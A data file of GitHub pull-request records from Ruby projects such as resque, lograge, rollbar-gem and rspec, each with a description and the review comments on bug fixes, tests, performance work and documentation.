552,resque/resque,987.0,As promised: Tests for Resque::WorkerQueueList,"['\n[![Coverage Status](https://coveralls.io/builds/28519/badge)](https://coveralls.io/builds/28519)\n\nCoverage increased (+1.0%) when pulling **ef107aa9bcad5268e9fe232a8a28f38303620277 on einarj:WorkerQueueListTests** into **055b65903e1f449e37370c1daf25977085f8f8e3 on resque:master**.\n', ""This is all in the Spec syntax, can you change it to use the Unit syntax, please? That's what the rest of the suite is written in."", ""Thanks so much for this patch. I know that's a lot of little things..."", ""To be honest, this type of feedback is one of the motivators for doing this (learning). I'll look into it :)"", ""Excellent! I always just don't want to put people off contributing, so I try to be gentle. :)"", '\n[![Coverage Status](https://coveralls.io/builds/28561/badge)](https://coveralls.io/builds/28561)\n\nCoverage remained the same when pulling **2d27bb36b82aa07c600cd2bf29460dff6f5cca9c on einarj:WorkerQueueListTests** into **055b65903e1f449e37370c1daf25977085f8f8e3 on resque:master**.\n', 'Just need to remove that one whitespace line.', '\n[![Coverage Status](https://coveralls.io/builds/28933/badge)](https://coveralls.io/builds/28933)\n\nCoverage increased (+0.28%) when pulling **a2bedc585f43dd5cd40c24c76c7156879053d04c on einarj:WorkerQueueListTests** into **055b65903e1f449e37370c1daf25977085f8f8e3 on resque:master**.\n', 'Thank you! <3']"
553,roidrage/lograge,9.0,"This PR _tries_ to reduce method calls and object allocations.

See https://gist.github.com/splattael/5404417 for some benchmarks.","['Any chance of before/after performance numbers?', ""I've added some benchmarks and did further optimizations.\r\nSee PR description."", ""I've redone my previous changes to match current state of lograge.\r\n\r\nCurrently, I see an overall performance increase of ~60%.\r\nSee benchmark: https://gist.github.com/splattael/5404417"", ""@splattael I'm gonna give this a good look over at the weekend and get it merged. Hold tight. "", ""@benlovell Thank you!\r\n\r\nI know, this PR got huge over time. I happily slim it down if you think I'm refactoring too much here.\r\nJust ping me if you want me to rebase or squash commits :)"", ""Hey @splattael, sorry for the delay. I've had a look over these changes and while they look good in principal - a good portion of the code has moved on since this was first proposed (unsurprisingly, of course.)\r\n\r\nIf you're happy to rebase and deal with anything that surfaces, I'll be happy to get this landed in master. Thanks :heart: "", ""@benlovell I've redone my optmizations on current master.\r\n\r\nThe results from [benchmark](https://gist.github.com/splattael/5404417) _after_ each commit starting with master:\r\n\r\nCommit | ips\r\n----- | ---\r\na1a15a7 | 28046.09\r\n0f31064 | 30187.33\r\n44c26fa | 30034.65\r\n63f61f7 | 32891.11\r\ncaf7ffe | 43526.63\r\n4f093d5 | 44938.13\r\n27083c0 | 44999.33\r\n481301e | 45808.29\r\n\r\n(ips = instructions per second)\r\n\r\nNote, I had to work around Rubocop in some cases (e.g. https://github.com/splattael/lograge/commit/63f61f7658fbd166ddef570517f1e537826458b4#diff-d3a7c7717409a1c1353805f9579b980bR88)\r\n\r\n\r\nFeedback is welcome :neckbeard: "", 'Where did you have to work around rubocop and why? ', 'I like it, impressive performance improvement! :+1: \r\n', 'This broke the tests.', '@pxlpnk Thanks for the heads-up! Fixed.\r\nNote to myself: Do not submit patches in the morning. From bed. Via iPad. Without glasses :rage4: ', ':+1:  a classic :sleeping: commit ', ""@splattael this is looking awesome. If you update the changelog I'll get this merged. Thanks! :heart_eyes: "", ""@benlovell I've added an entry to the changelog."", ':rainbow: thanks!', '@benlovell Thanks for merging :green_heart: ', 'Persistence ftw :+1: ']"
554,rollbar/rollbar-gem,171.0,"It's useful to report the PID of the process that raised the exception,
this commit adds it to server data so we can see it in Rollbar.

I will manually test it a little more, please don't merge until I report that it works properly.

I've only run the specs with this Ruby:
ruby 2.1.2p95 (2014-05-08 revision 45877) [x86_64-linux]

Process.pid seems to work on one Windows computer we have here, though I don't know how universal support is or whether an exception is thrown if it is not supported. Ruby documentation says it doesn't work on all platforms.","['Merged, thanks! This will be part of the next release (1.2.8).', 'Released in 1.2.8']"
555,rsl/stringex,163.0,Closes #162,[]
556,rspec/rspec-core,1726.0,"Support absolute path patterns.

While this wasn't officially supported previously, setting `rake_task.pattern` to an absolute path pattern in RSpec 3.0 and before worked since it delegated to `FileList` internally (but now just forwards the pattern on to the `rspec` command).

Fixes #1721.","['I like the spec refactoring :)', 'OK, I pushed another fix for the windows case.', 'LGTM', 'Cherry picked to 3-1-maintenance and then released in 3.1.5.']"
557,rspec/rspec-core,1866.0,Expose reporter to running examples and make the `Reporter#message` api public. Fixes #1851.,"[""Think I've fixed this all up"", ""LGTM, but let's make sure this meets @nyarly's needs before merging."", 'I think I can work with that - the reporter attribute is great, and I can either filter `#message` calls or build a parallel event dispatcher.']"
558,rspec/rspec-core,1869.0,"This is an extension of #1866 as part of work for #1851, it allows the reporter to send an arbitrary event to any registered listeners, it won't allow you to send RSpec internal events and creates a `CustomNotification` for each event. /cc @nyarly ","[""That's rad - thanks so much"", 'I like the idea and the implementation is nice and straightforward.', 'Fixed up', ""> Fixed up\r\n\r\nThe fixes are an improvement but there are a couple more things I'd like to see before this is merged."", 'LGTM, merge when green.', ""Noticed you didn't add a changelog entry for this so I added one in f00b298509e324120c39be0df37b0dd28021af84.  Feel free to revise if you have a better description in mind :)."", 'Sorry, I did this at RubyConAU so I may have gotten distracted ;)']"
559,rspec/rspec-core,1870.0,"In general we want to require as little of the std lib as possible to prevent false positives with peoples code due to us using part of the std lib and then developers not requiring those parts, this removes our existing usage of set which is normally done for uniqueness / constant time lookup reasons and replaces it with a class that uses a hash internally.","[""Looking good.  It concerns me a little that `LookupSet` isn't directly tested.  WDYT about adding specs for it?  It is pretty simple but it would provide confidence it mirrors `Set` behavior if you defined a shared example group for the methods that both support and applied it to both to show they have the same behaviors."", ""Yeah this was a proof of concept really, I think it needs it's own file and specs."", ""I'll try to do that sometime tomorrow"", 'Think this is ready for a review...', 'can you remove this as well?\r\n\r\nhttps://github.com/rspec/rspec-core/blob/850b904cbbdb6870b9e2b0724436a126ca029689/spec/rspec/core_spec.rb#L7', 'Removed and renamed...', 'LGTM, merge when green.', ""Merging despite Appveyor failure because it's a gem fetch error and the other appveyor job passed""]"
560,rspec/rspec-core,1945.0,This is a solution to #1941 makes `--only-failures` takes precedence over `run_all_when_everything_filtered` and exit correctly when there are no failures,['LGTM.  Merge when green.  No need for a changelog entry since `--only-failures` is new anyway.']
561,rspec/rspec-core,1977.0,"These are some fixes necessary for rspec/rspec-support#210 in order to support rspec/rspec-mocks#956.

I also heavily refactored the exception presenter creation; it was very messy before.  Still a bit messy but much improved.","[""Kicked the travis build now that rspec/rspec-expectations#796 is merged.  Hopefully it'll pass this time."", 'This is green.  Anyone from @rspec/rspec care to review?', ""few comments, specs seem fine. Quite a few new large methods, might be good to break them apart if it's appropriate, but the implementation is :sparkles: :+1: "", ""I addressed the typo pointed out by @samphippen.  The naming concerns brought up by @JonRowe are valid but they aren't new names in this PR (they just show up in the diff due to code moving to a new file) and I've got other aspects of rspec/rspec-mocks#956 that's a better use of my time, IMO, so I'm hoping @JonRowe will be cool with this being merged as-is and a follow up PR with renamings can happen if that's deemed important enough."", 'Yep, cool with that.']"
562,rspec/rspec-core,1980.0,"Add a new  `MessageFormatter` as a fallback when no other formatter in use implements `#message`

Fixes #1978","['Ping @myronmarston ', 'Tweaked a bit', 'LGTM']"
563,rspec/rspec-expectations,294.0,"This was deprecated. This removes it.

Not sure I've updated the specs properly. Review welcome.","['\n[![Coverage Status](https://coveralls.io/builds/123278/badge)](https://coveralls.io/builds/123278)\n\nCoverage decreased (-0%) when pulling **22c4a56f5bb8dbc1944991cc35985a54ae680f7c on samphippen:remove-negative-raise-specific-class** into **b43952f74fcd610f20d4b6e09bbc5237c38cece5 on rspec:master**.\n', ""There's a cuke that asserts the opposite behaviour ;)"", ""Given that we can't completely remove the code for this, and thus there's no maintenance benefit to turning it into an error, I'm wondering if we should just keep it as a warning. Maybe it's best to make it print an explanatory warning explaining that it hides problems. Thoughts? I'm on the fence, honestly."", ""@myronmarston a similar style of 'removal' happened for at_least(0). Whilst I agree that behaviour was weirder I think that the behaviour on this is sufficiently weird to warrant stopping people from doing it. If we don't merge this I'd  at the every least like .not_to raise(SomeSpecificClass) warn the user if any other exception class was raised in that block.\r\n\r\nOverall though: I think this behaviour is very strange and most use of it is probably buggy."", ""I'd rather not let this pull request go stale, @JonRowe @alindeman @myronmarston @soulcutter what do people think to merging/closing this?"", ""I'm in favour of merging... I know it's a non-error but it's a guard against doing silly things no?"", 'Maybe the message could be `""is not valid""` or similar? At some point in the future, it won\'t really matter that it was removed.', ""@alindeman that's better, thanks :)"", 'Works for me.', ""@samphippen -- can you fix the build here, rebase, and address @alindeman's wording suggestion?  Then we can merge this."", '@myronmarston on it :cat: ', '\n[![Coverage Status](https://coveralls.io/builds/166176/badge)](https://coveralls.io/builds/166176)\n\nCoverage increased (+0%) when pulling **2655125990ac5655965d8f69bea267b578684079 on samphippen:remove-negative-raise-specific-class** into **4ccacb8a720aa671374bed0e225d20e6e092271f on rspec:master**.\n', ""I'm going to try and get this one closed out today."", '@myronmarston can you rereview when you get a spare five :)', '\n[![Coverage Status](https://coveralls.io/builds/175744/badge)](https://coveralls.io/builds/175744)\n\nCoverage increased (+0.14%) when pulling **8f6c74c780fb953009375109a484400392dd5293 on samphippen:remove-negative-raise-specific-class** into **da3c5172baada490e04c922dc4666f630473d252 on rspec:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/175872/badge)](https://coveralls.io/builds/175872)\n\nCoverage increased (+0.14%) when pulling **afd8631d9d4cb3d16c724bbd9ae2d44db13ad407 on samphippen:remove-negative-raise-specific-class** into **da3c5172baada490e04c922dc4666f630473d252 on rspec:master**.\n', '\n[![Coverage Status](https://coveralls.io/builds/176033/badge)](https://coveralls.io/builds/176033)\n\nCoverage increased (+0.15%) when pulling **3d29f7ff5d3d99978b178ce5afd1d1fda1d4f8e7 on samphippen:remove-negative-raise-specific-class** into **da3c5172baada490e04c922dc4666f630473d252 on rspec:master**.\n', ""@myronmarston please take another look when you can, I'd like to get this one merged this evening :boom: "", 'Looking good.  I left two small suggestions, then I think we can merge this.', 'Oh yeah: this needs a changelog entry, too.', ""@myronmarston let me know if you don't like the changelog entry, otherwise I'll merge this when travis says green."", '\n[![Coverage Status](https://coveralls.io/builds/176184/badge)](https://coveralls.io/builds/176184)\n\nCoverage increased (+0.15%) when pulling **d867ff35385ff28207d34f0f8540b86a47548512 on samphippen:remove-negative-raise-specific-class** into **da3c5172baada490e04c922dc4666f630473d252 on rspec:master**.\n', '> I am so bad\r\n> I forgot to put a name in the changelog entry\r\n> One more travis round :D', '\n[![Coverage Status](https://coveralls.io/builds/176214/badge)](https://coveralls.io/builds/176214)\n\nCoverage decreased (-0.14%) when pulling **58ade10166b4d340e7085c57c68b24e11dfccb51 on samphippen:remove-negative-raise-specific-class** into **da3c5172baada490e04c922dc4666f630473d252 on rspec:master**.\n']"
564,rspec/rspec-expectations,502.0,"First pass at the final part of #471, probably needs more specs but WDYT in general?

(Fixes #471 so it'll autoclose)","[""This is nearly a year old.  Gonna close it since it's so stale.  #471 is still open so hopefully someone will tackle that at some point.""]"
565,rspec/rspec-expectations,544.0,"Rubocop was discussed a bit a while back.  I thought I'd give it a shot.  This is a WIP trying to figure out what checks to enable/disable and whether or not we want to use it.

Feedback wanted.","[""i'm not sure what's the overhead of using the ```rubocop```, and enforcing it's usage in future features.\r\nthat being said, some of the use-cases are fairly nice and some don't seem very beneficial. "", ""Pretty certain rubocop can be overly judgy but I'm in :)"", '@myronmarston CI failing:\r\nhttps://travis-ci.org/rspec/rspec-expectations/jobs/24899893', ""+1 on the idea. We've seen surprising code quality improvements at work using rubocop, particularly from newer contributors."", ""> We've seen surprising code quality improvements at work using rubocop, particularly from newer contributors.\r\n\r\nGood to know.  I plan to revisit this once 3.0 ships."", 'OK, I think this is ready to review.  I squashed it all into one commit.  The build change stuff should be moved in to rspec-dev but that can change post-merge.', 'Left a few nit picks but in general looks good.', 'I addressed the excess line endings and answered the rest of the open questions/comments.  I plan to merge once green to master and 3-0-maintenance.']"
566,rspec/rspec-expectations,567.0,"This is a spike for #552.  Feedback wanted.

The basic solution here is pretty straightforward:

* For one matcher (let's call it the ""outer"" matcher), rather than passing it the actual block, pass it a new block that performs matching against the other matcher (call it the ""inner"" matcher) using the actual block.
* This causes the real block to be executed when the outer matcher calls our intermediate block, making things work properly.

This straightforward approach didn't work for some of our block matchers, though:

* `raise_error` and `throw_symbol` cannot be the outer matcher, because when an error is raised or a symbol is thrown it jumps out of the inner matcher's `matches?` (since it doesn't expect a raise or throw).  They must be the inner matcher, regardless of what order the matchers were chained in.  To make this work, I added a new method to the matcher protocol, `block_can_be_wrapped_for_compound_expression?`. We use this to figure out if a particular matcher must always be used as the inner matcher.
* The `yield_xyz` matchers pass an argument (the yield probe) to the `expect` block, which gets a little hairy when the yield matcher is the outer matcher.  The solution I came up with is to wrap it in an extra proc that receives an forwards the args on to the inner proc.

There are also some open questions:

* I really hate the `block_can_be_wrapped_for_compound_expression?` method name but couldn't come up with a better name for it.  Any ideas?  Also, when the method is not defined, it defaults to `true` (as the other block matchers allow the block wrapping), but it feels inverted to me to have the optional method be treated as `true` if not defined.  We should find a wording that would allow us to default it to `false` but I can't think of a good method name for that.  Alternately, we could assume all block matchers can't be wrapped and opt-in to the ones that can (`change`, `yield_xyz`, `output`).
* How should it behave when two matchers are used that both pass args to the block?  My solution for the `yield` matcher will only work when there's not another one like this.
* I'm really not happy with how the logic for this is factored.  Having one method named `perform_block_matches_while_only_calling_block_once` and then another named `perform_block_matches_while_only_calling_block_once_against` is terrible, but it was the best I could think of.  Suggestions?
* This changes the semantics of `or` in a subtle way: before, we would not run `matcher_2.matches?` if `matcher_1.matches?` was already true as it's not necessary to check the second.  For block matchers, we check both up front because we only want the block to get run once.
* I don't think we have any matchers like this but a custom matcher could theoretically call a block multiple times which could make things odd in these situations (particularly if it was the outer matcher -- then it would cause the inner match to be performed multiple times).  Should we do anything about this?

TODO:
- [x] The coverage for the `or` case isn't as fleshed out as the `and` case -- flesh it out.
- [x] Provide clear errors for the cases we won't support (such as two `raise_error` matchers).
- [x] For whatever additions to the protocol we make, document them.
- [x] Get the build green :).","['/cc @xaviershay @JonRowe @cupakromer @yujinakayama @samphippen @soulcutter ', ""I think the block support in compound expectations should be limited (at least in the initial support) to only cases where it definitely makes sense and people can guess how the expectation behaves. This is really complex even for us.\r\n\r\n> * How should it behave when two matchers are used that both pass args to the block? My solution for the yield matcher will only work when there's not another one like this.\r\n> * I don't think we have any matchers like this but a custom matcher could theoretically call a block multiple times which could make things odd in these situations (particularly if it was the outer matcher -- then it would cause the inner match to be performed multiple times). Should we do anything about this?\r\n\r\nI think we should explicitly raise errors in these cases, though it may require additional API in the matcher protocol and honestly I'm not sure if it's worth for the rare use cases.\r\n\r\nBy the way, as an alternative way, once I thought this could be possibly handled by a sort of _memoized proc_ which is run only once for multiple invocations and keeps any error or thrown symbol as its attribute. However I noticed it's impossible since there's no way to catch every thrown symbol.\r\n"", 'This is ready for some more eyes on it.\r\n\r\nThere are two primary questions remaining here:\r\n\r\n* To we make block matchers opt-in to being usable as the outer matcher or opt-out? (The current implementation is opt-out).\r\n* What do we call the method that opts in or out?\r\n\r\nFor the first question, I see arguments for both sides:\r\n\r\n* Generally speaking, the only block matchers that cannot be used as the outer matcher are those that deal with a construct that will jump up the call stack (e.g. `raise_error` and `throw_symbol`).  It\'s hard to imagine any more matchers that deal with those constructs than the two we have already, so that\'s a point in favor of opting out.\r\n* However, it\'s probably safer to make it opt-in. The risk of keeping it opt-out is that for a custom matcher that can\'t be used as the outer matcher, a compound expression involving it may fail in ways the user does not expect.  However, if we make it opt-in, there\'s also a risk: a risk that even though the matcher could be used as the outer one, the user will get a confusing ""cannot be combined with..."" error when they try to combine it with `raise_error` or another such matcher.\r\n* Keeping it opt-out has another side benefit for us: we have matcher shared examples that will fail on a matcher that needs to opt-out if it hasn\'t already opted-out.  (This worked for `throw_symbol`, for example: it\'s not tested directly in `compound_spec.rb` but due to the shared specs I got a failure for it and had to define the method on it to opt-out).  We don\'t get a similar audit effect if we make it opt-in.\r\n\r\nThoughts?\r\n\r\n/cc @JonRowe @xaviershay @samphippen @soulcutter @cupakromer ', 'Idea from a coworker: `expects_call_stack_jump?`', ""OK, I've gotten this to the point where I'm happy at it.   Any takers to review it?  BTW, @yujinakayama -- thanks for your earlier review!"", 'LGTM, my comments were all straightforward.\r\n\r\nMerge conflict though :(', '@myronmarston although, not really related to this PR, I was just wondering, why don\'t we also support?\r\n```expect { do_something }.to change(object, :attribute)```\r\ne.g:\r\n\r\n```ruby\r\nit \'expect { do_something }.to change(object, :attribute)\' do\r\n  person = Struct.new(:name, :age).new(""bob"", 44)\r\n  expect {\r\n    person.age = 23\r\n    person.name = \'alice\'\r\n  }.to change(person, :name).to(\'alice\').and change(person, :age).to(23)\r\nend\r\n#fails ...\r\n```\r\n```\r\nFailure/Error: expect {\r\n       You must pass an argument rather than a block to use the provided matcher (change #name to ""alice"" and change #age to 23), or the matcher must implement `supports_block_expectations?`.\r\n', ""> @myronmarston although, not really related to this PR, I was just wondering, why don't we also support?\r\n> expect { do_something }.to change(object, :attribute)\r\n\r\nThat's exactly what this PR is about -- adding support for compound block expectations."", ""@myronmarston \r\n> That's exactly what this PR is about -- adding support for compound block expectations.\r\n\r\nI was going over the specs and code, and didn't notice anything related to \r\n```expect { do_something }.to change(object, :attribute).and ...``` \r\neverything was in regard to\r\n```expect { do_something }.to change { object.attribute }.and ...```\r\n\r\nsorry, maybe I'm missing something :-)"", ""Support for both forms is added by this.  `change(object, :attribute)` vs `change { object.attribute }` doesn't make a difference here.  The important thing is that this PR adds support for `change.and change`, however the change matcher is used."", ""OK, @xaviershay, I addressed your feedback, took care of some issues I had noticed and did a further refactoring (the fact that I had to raise the `ClassLength` cop to 96 for `Compound` bugged me, but I couldn't think of a good refactoring at the time).\r\n\r\nI also rebased this to address the merge conflict.  My post-rebase changes start at 5cc8b66985d94df609907efc057aa7f4fcf8facf. Here's the compare view for my post-rebase changes, if that helps:\r\n\r\nhttps://github.com/rspec/rspec-expectations/compare/a864c477324e143aabb810f5f0ed4bd6fcd3aaf8...ce919e1d490811390c0525e33d6efcee0a595a85"", 'ship it', ':+1: :ship: :shipit: :sailboat: ', 'Really awesome PR. I\'m still getting error on the code posted by @yelled3, with both `change(object, :attr)` and `change{object.attr}`:\r\n\r\n```ruby\r\nit \'expects change\' do\r\n  person = Struct.new(:name, :age).new(""bob"", 44)\r\n  expect {\r\n    person.age = 23\r\n    person.name = \'alice\'\r\n  }.to change{person.name}.to(\'alice\').and change{person.age}.to(23)\r\nend\r\n```\r\n\r\nOr even\r\n\r\n```ruby\r\nx = 1\r\ny = 2\r\nexpect { x += 2; y += 4 }.to change { x }.to(3).and change { y }.to(6)\r\n```\r\n\r\nError\r\n\r\n```\r\nYou must pass an argument rather than a block to use the provided matcher\r\n(change result to 3 and change result to 4), or the matcher must implement\r\n`supports_block_expectations?`.\r\n```', ""This got merged but has not been released yet. It'll be in RSpec 3.1. You can point your gemfile at our master branch on each repo if you want it before then. "", ""@myronmarston I pointed to master but apparently `guard-rspec` didn't manage to read the right dependency. It works. Thanks!\r\n\r\n```ruby\r\n  gem 'rspec', github: 'rspec/rspec'\r\n  gem 'rspec-core', github: 'rspec/rspec-core'\r\n  gem 'rspec-mocks', github: 'rspec/rspec-mocks'\r\n  gem 'rspec-expectations', github: 'rspec/rspec-expectations'\r\n  gem 'rspec-support', github: 'rspec/rspec-support'\r\n```""]"
567,rspec/rspec-expectations,594.0,"Certain strangely built proxy objects can mess with out ""no tampering"" method lookup code, in those cases we'll try to perform the lookup the old fashioned way as a fallback, this was fixing #591 for me yesterday but for some reason I now can't replicate that, nor can I replicate it working on 2.14.2","[""Can you point me to the code in mongoid that requires this?  I'm trying to understand why it's needed and how it works..."", ""OK, I messed with your repro gist locally and I get what's going on now.  I agree that a change like the one here is a change we should make.  However, there's a potential issue with objects that have their own definition of `method`.  This spec, when added the the same context as the one you added, fails:\r\n\r\n``` ruby\r\nit 'fails with `NameError` when an undefined method is fetched from an object that has overriden `method`' do\r\n  object = ClassWithMethodOverridden.new\r\n  expect {\r\n    Expectations.method_handle_for(object, :some_undefined_method)\r\n  }.to raise_error(NameError)\r\nend\r\n```\r\n\r\nProduces:\r\n\r\n```\r\n  1) RSpec::Expectations.method_handle_for(object, method_name) fails with `NameError` when an undefined method is fetched from an object that has overriden `method`\r\n     Failure/Error: expect {\r\n       expected NameError, got #<ArgumentError: wrong number of arguments (1 for 0)> with backtrace:\r\n         # ./spec/rspec/expectations_spec.rb:33:in `method'\r\n         # ./lib/rspec/expectations.rb:63:in `rescue in method_handle_for'\r\n         # ./lib/rspec/expectations.rb:61:in `method_handle_for'\r\n         # ./spec/rspec/expectations_spec.rb:70:in `block (4 levels) in <module:RSpec>'\r\n         # ./lib/rspec/matchers/built_in/raise_error.rb:42:in `call'\r\n         # ./lib/rspec/matchers/built_in/raise_error.rb:42:in `matches?'\r\n         # ./lib/rspec/expectations/handler.rb:24:in `handle_matcher'\r\n         # ./lib/rspec/expectations/expectation_target.rb:59:in `to'\r\n         # ./lib/rspec/expectations/expectation_target.rb:117:in `to'\r\n         # ./spec/rspec/expectations_spec.rb:69:in `block (3 levels) in <module:RSpec>'\r\n```\r\n\r\nThis is a problem, because callers of `method_handle_for` expect it to either return a method object or raise a `NameError`.  They don't expect it to potentially raise any error, and once we fall back to `object.method` that's possible.  I think that we should re-raise the original `NameError` if `object.method` triggers any error.\r\n\r\nOne other thing I discovered while looking into this: our `uses_generic_implementation_of?` check on [this line](https://github.com/rspec/rspec-expectations/blob/3817dc9846c0d80493804a820e1a6fea28d630eb/lib/rspec/matchers/built_in/operators.rb#L48) is buggy.  This was actually the main thing confusing me about this whole thing...I thought the failure meant that mongoid was defining `=~` somewhere.  The problem is that `uses_generic_implementation_of?` returns `false` when it gets a `NameError` -- which makes sense in that context -- the `NameError` indicates it doesn't have an implementation of the operator.  But if the object has no implementation of the operator, then it's safe for us to use the `match_array` matcher.  So really, the `if uses_generic_implementation_of?` should probably be `if !has_non_generic_implementation_of?`, where `uses_non_generic_implementation_of?` is the inverse of `uses_generic_implementation_of?` except for when a `NameError` is triggered -- then it can return `false` (rather than inverting the `false` to `true`), and things would have worked OK even though the `method_handle_for` implementation had the issue you identified."", ""Makes sense, I'll rework this in light of the above later today."", ""Hmm, I thought about the second point, I don't believe it is buggy, the mongoid object is a proxy, it doesn't directly implement `=~` but the underlying Array does... we just weren't detecting that. I've made the first suggested changes though..."", '> Hmm, I thought about the second point, I don\'t believe it is buggy, the mongoid object is a proxy, it doesn\'t directly implement =~ but the underlying Array does... we just weren\'t detecting that.\r\n\r\nThere were two bugs here.  `should =~` only acted buggy because of _both_ of the underlying bugs.  One was the one you\'ve already fixed; the other is this one I tried to explain (but perhaps did so poorly).  The bug was only manifested because of both bugs -- if either was fixed, it wouldn\'t have manifested.  (At least, that\'s my understanding of the situation -- I haven\'t actually tested it out so I might be misinterpretting the evidence).\r\n\r\nHere\'s an example showing the 2nd bug:\r\n\r\n``` ruby\r\nRSpec.describe ""should =~ array"", :uses_should do\r\n  context ""when the array undefines `=~`"" do\r\n    it \'matches using the contain_exactly matcher\' do\r\n      array_klass = Class.new(Array) { undef =~ }\r\n      array = array_klass.new([1, 2])\r\n\r\n      array.should =~ [1, 2]\r\n\r\n      expect {\r\n        array.should =~ [0, 1, 2]\r\n      }.to fail_with(/expected collection contained/)\r\n    end\r\n  end\r\nend\r\n```\r\n\r\nFails with:\r\n\r\n```\r\n1) should =~ array when the array undefines `=~` matches using the contain_exactly matcher\r\n     Failure/Error: array.should =~ [1, 2]\r\n     NoMethodError:\r\n       undefined method `=~\' for [1, 2]:#<Class:0x007f9e64554c68>\r\n     # ./lib/rspec/matchers/built_in/operators.rb:99:in `__delegate_operator\'\r\n     # ./lib/rspec/matchers/built_in/operators.rb:91:in `eval_match\'\r\n     # ./lib/rspec/matchers/built_in/operators.rb:51:in `block in use_custom_matcher_or_delegate\'\r\n     # ./spec/rspec/matchers/built_in/contain_exactly_spec.rb:59:in `block (3 levels) in <top (required)>\'\r\n```\r\n\r\nNotice that in this case it tries to delegate `=~` to an object that does not define `=~`.  Our logic is meant to only delegate when `=~` has a meaningful definition on `actual`.  If it\'s not even defined, it obviously isn\'t a meaningful definition and results in this `NoMethodError` when it should use the `contain_exactly` matcher instead.\r\n\r\nDoes that make more sense?', ""The above should mean `uses_generic_implementation_of?` returns `false`, if that's causing the behaviour then it's a new bug but not one that's affecting mongoid, it does implement `=~`, it just needs `uses_generic_implementation_of?` to return true."", ""> The above should mean uses_generic_implementation_of? returns false, if that's causing the behaviour then it's a new bug but not one that's affecting mongoid, it does implement =~, it just needs uses_generic_implementation_of? to return true.\r\n\r\nWithout your fix, it hits the `rescue NameError` (because the `method_handle_for` lookup fails), which in turn causes it to return `false` from `uses_generic_implementation_of?`, which causes it to delegate to the collection's `=~` rather than using our matcher.  So you're right, with your fix in place, the bug in `uses_generic_implementation_of?` isn't hit by mongoid anymore, but it's the combination of the two that caused the bug with `should =~` in the first place, and I see this as related.\r\n\r\nHowever, would you rather I tackle it in a separate PR?"", ""> However, would you rather I tackle it in a separate PR?\r\n\r\nYes please, I'm not entirely convinced your bug applies here, it's a code path that should never be reached in the case of #591."", ""> Yes please, I'm not entirely convinced your bug applies here, it's a code path that should never be reached in the case of #591.\r\n\r\nIt definitely is reached.  I took your [gist](https://gist.github.com/JonRowe/ed594ac3ac8150178046) and edited `uses_generic_implementation_of?` to make it return `true` rather than `false` for the `NameError` clause and it fixed the issue.\r\n\r\nRegardless, this going back-and-forth isn't particularly productive and I'm happy to deal with it in a separate PR so I'll plan to do that."", ""> It definitely is reached. I took your gist and edited uses_generic_implementation_of? to make it return true rather than false for the NameError clause and it fixed the issue.\r\n\r\nWhich is what this PR fixes, it makes `uses_generic_implementation_of?` return `true` because that's the correct behaviour here."", ""> Which is what this PR fixes, it makes uses_generic_implementation_of? return true because that's the correct behaviour here.\r\n\r\nRight, I'm saying that w/o your fix in this PR, your gist hits the additional bug in `uses_generic_implementation_of?`.  Either of the fixes (this PR, or my future PR that deals with the `NameError` clause returning false) are sufficient to fix the buggy behavior in `should =~ mongoid_collection` reported in #591.  The bug was only surfaced because of the combination of the `method_handle_for` bug and the `uses_generic_implemetnation_of?` bug.\r\n\r\nWe can consider #591 resolved once we merge a PR like this into master but that doesn't change the fact that `uses_generic_implementation_of?` still has a related bug that I'm going to fix in another Pr."", ""So is this good to go as is? I'll update the support PR to reflect this when this is merged."", ""I'd like to see the separate PR before I'm convinced theres an additional bug beyond this, I'm still convinced that shouldn't be reached if this was working correctly."", ""> I'd like to see the separate PR before I'm convinced theres an additional bug beyond this, I'm still convinced that shouldn't be reached if this was working correctly.\r\n\r\nIf this was working correctly, then you're right, in the mongoid case the bugginess in `uses_generic_implementation_of?` would not be reached.  It doesn't change the fact that the bugginess is still there and is surfaced in the case where `actual` has _no_ definition of `=~`.  Clearly, delegating `=~` to `actual`'s non-existent definition of the method is a bug, given it triggers a `NoMethodError`.\r\n\r\n> So is this good to go as is? I'll update the support PR to reflect this when this is merged.\r\n\r\nNo, there's an open comment above that needs to be addressed still.  Also, what support PR?  I don't see one..."", ""Huh, must not have pushed it, but that's where the fix needs to lie for master."", ""> Huh, must not have pushed it, but that's where the fix needs to lie for master.\r\n\r\nYep, I've been waiting for you to open a PR there but figured you wanted to get this ready to merge first :)."", 'LGTM, merge when green.\r\n\r\nNeeds a changelog, though.']"
568,rspec/rspec-expectations,604.0,@myronmarston support for https://github.com/rspec/rspec-support/pull/89,"['Looking good.', 'Addressed feedback.', 'LGTM', 'This is awaiting rspec/rspec-support#89 right?', ""Yes, won't work without it."", 'just kicked the build now that other PR has been merged.']"
569,rspec/rspec-expectations,622.0,"When the action value of passed to the `all` matcher is not enumerable,
rather than failing to match and returning an error it raises an
exception. This commit ensures that `actual` is enumerable before
proceeding with matching.","['For #613 ', ""@myronmarston Hey here's a quick fix for the problem. I'm happy to address any feedback you may have"", 'Thanks, @haosu.  This is looking good.  I left a few suggestions.\r\n\r\nAlso, the build is failing due to our rubocop rules.  Run `bundle exec rake rubocop` to run the same checks locally.', '@myronmarston Awesome, thanks for the feedback, addressing now', '@myronmarston Updated', ""@myronmarston It seems that one of the build is failing on `jruby-18mode` (the matcher doesn't actually fail). I'm not too familiar with jruby or ruby 1.8, is it because `String` is enumerable in that version?"", ""> I'm not too familiar with jruby or ruby 1.8, is it because String is enumerable in that version?\r\n\r\nYep.  Just change your spec to use some other object (like a number) instead."", 'Thanks, @haosu.  I merged and then followed up with 5b8be781ceb2aca7781e39f46240521f7abf4fa7.', 'Awesome, @myronmarston thanks for working with me on this']"
570,rspec/rspec-expectations,195.0,"I noticed a few pages of documentation displayed poorly because of markdown interpreting underscores to signify italics. This PR fixes those issues. Some examples:

  * https://www.relishapp.com/rspec/rspec-expectations/v/2-12/docs/built-in-matchers/end-with-matcher
  * https://www.relishapp.com/rspec/rspec-expectations/v/2-12/docs/built-in-matchers/start-with-matcher
  * https://www.relishapp.com/rspec/rspec-expectations/v/2-12/docs/built-in-matchers/specify-types-of-objects

While I was in there I also noticed the opportunity to normalize a lot of the code blocks to explicitly specify ruby as the language, which fixes some display issues. Some (not all) examples of format weirdness:

  * https://www.relishapp.com/rspec/rspec-expectations/v/2-12/docs/built-in-matchers/exist-matcher
  * https://www.relishapp.com/rspec/rspec-expectations/v/2-12/docs/built-in-matchers/raise-error-matcher
